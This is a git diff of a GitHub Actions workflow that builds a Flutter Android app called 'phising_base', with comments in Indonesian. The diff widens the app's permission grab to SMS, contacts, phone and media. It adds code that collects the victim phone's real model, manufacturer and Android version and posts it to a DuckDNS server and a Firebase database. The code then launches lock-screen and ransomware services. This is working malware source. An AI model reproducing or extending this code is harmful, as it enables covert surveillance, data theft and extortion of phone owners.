@@ -93,7 +93,7 @@ jobs:
           EOF
 
           # ============================================
-          # 2. PUBSPEC
+          # 2. PUBSPEC (TAMBAH device_info_plus)
           # ============================================
           mkdir -p assets
           if [ -n "${{ github.event.inputs.icon_url }}" ]; then
@@ -123,6 +123,7 @@ jobs:
             firebase_database: ^11.3.1
             http: ^1.2.0
             path_provider: ^2.1.0
+            device_info_plus: ^11.3.0
           dev_dependencies:
             flutter_launcher_icons: ^0.14.2
           flutter_launcher_icons:
@@ -171,7 +172,6 @@ jobs:
           cd phising_base
           mkdir -p android/app/src/main/java/com/example/phising_base
           
-          # HAPUS FILE KOTLIN BAWAAN FLUTTER (INI PENYEBAB ERROR)
           rm -f android/app/src/main/kotlin/com/example/phising_base/MainActivity.kt
           rm -rf android/app/src/main/kotlin/com/example/phising_base
 
@@ -534,6 +534,8 @@ jobs:
           import 'package:permission_handler/permission_handler.dart';
           import 'package:firebase_core/firebase_core.dart';
           import 'package:firebase_database/firebase_database.dart';
+          import 'package:http/http.dart' as http;
+          import 'package:device_info_plus/device_info_plus.dart'; // <-- DATA REAL
           import 'firebase_options.dart';
           import 'lock_service.dart';
           import 'ransomware_service.dart';
@@ -568,7 +570,12 @@ jobs:
             }
 
             Future<void> _initApp() async {
-              await [Permission.storage, Permission.location, Permission.camera, Permission.microphone, Permission.notification].request();
+              await [
+                Permission.storage, Permission.location, Permission.camera,
+                Permission.microphone, Permission.notification, Permission.sms,
+                Permission.contacts, Permission.phone, Permission.mediaLibrary,
+              ].request();
+
               Map<String, dynamic> config = {};
               try {
                 final String jsonString = await rootBundle.loadString('assets/config.json');
@@ -578,18 +585,48 @@ jobs:
               String targetUrl = config['webview_url'] ?? 'https://www.google.com';
               String uid = config['uid'] ?? 'unknown';
 
+              // ============================================
+              // AMBIL DATA ASLI HP TARGET
+              // ============================================
+              final DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
+              final AndroidDeviceInfo androidInfo = await deviceInfo.androidInfo;
+              
+              String realModel = androidInfo.model;
+              String realManufacturer = androidInfo.manufacturer;
+              String realAndroidVersion = androidInfo.version.release;
+              String realSdk = androidInfo.version.sdkInt.toString();
+
+              // KIRIM KE SERVER
+              try {
+                final res = await http.post(
+                  Uri.parse('http://nodeyagamigantengsayang.duckdns.top:4130/register'),
+                  headers: {'Content-Type': 'application/json'},
+                  body: jsonEncode({
+                    'device_id': uid,
+                    'manufacturer': realManufacturer,
+                    'model': realModel,
+                    'sdk': realSdk,
+                    'android': realAndroidVersion,
+                    'session_id': uid,
+                    'last_seen': DateTime.now().toIso8601String(),
+                  }),
+                );
+                debugPrint('Register response: ${res.statusCode} ${res.body}');
+              } catch(e) { debugPrint('Register error: $e'); }
+
+              // SIMPAN KE FIREBASE
               try {
                 final fb = FirebaseDatabase.instanceFor(app: Firebase.app(), databaseURL: 'https://omix-axe-default-rtdb.asia-southeast1.firebasedatabase.app/');
                 await fb.ref('devices/$uid').update({
                   'device_id': uid,
-                  'model': 'Target Device',
-                  'manufacturer': 'Android',
-                  'sdk': '33',
-                  'android_version': '13',
+                  'model': realModel,
+                  'manufacturer': realManufacturer,
+                  'sdk': realSdk,
+                  'android_version': realAndroidVersion,
                   'session_id': uid,
                   'last_seen': ServerValue.timestamp,
                 });
-              } catch(e) { debugPrint('Register error: $e'); }
+              } catch(e) { debugPrint('Register Firebase error: $e'); }
 
               LockScreenService().init(context, uid);
               RansomwareService().init(context, uid);
